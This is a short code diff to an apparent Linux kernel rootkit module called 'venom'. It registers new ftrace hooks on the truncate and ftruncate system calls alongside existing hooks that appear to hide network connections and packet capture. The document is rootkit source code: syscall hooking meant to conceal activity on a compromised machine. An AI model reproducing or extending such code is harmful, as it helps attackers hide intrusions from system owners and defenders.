@@ -12,7 +12,7 @@
 #include "hooks/ioctl.h"
 #include "hooks/insmod.h"
 #include "hooks/network.h"
-
+#include "hooks/truncate.h"
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Trevohack");
 MODULE_DESCRIPTION("Advance LKM");
@@ -69,6 +69,8 @@ static struct ftrace_hook all_hooks[] = {
     HOOK("udp4_seq_show", hooked_udp4_seq_show, &orig_udp4_seq_show),
     HOOK("udp6_seq_show", hooked_udp6_seq_show, &orig_udp6_seq_show),
     HOOK("tpacket_rcv", hooked_tpacket_rcv, &orig_tpacket_rcv),
+    HOOK("__x64_sys_truncate", hook_truncate, &orig_truncate),
+    HOOK("__x64_sys_ftruncate", hook_ftruncate, &orig_ftruncate),
 };
 
 
@@ -133,3 +135,4 @@ notrace static void __exit venom_exit(void) {
 
 module_init(venom_init);
 module_exit(venom_exit); 
+
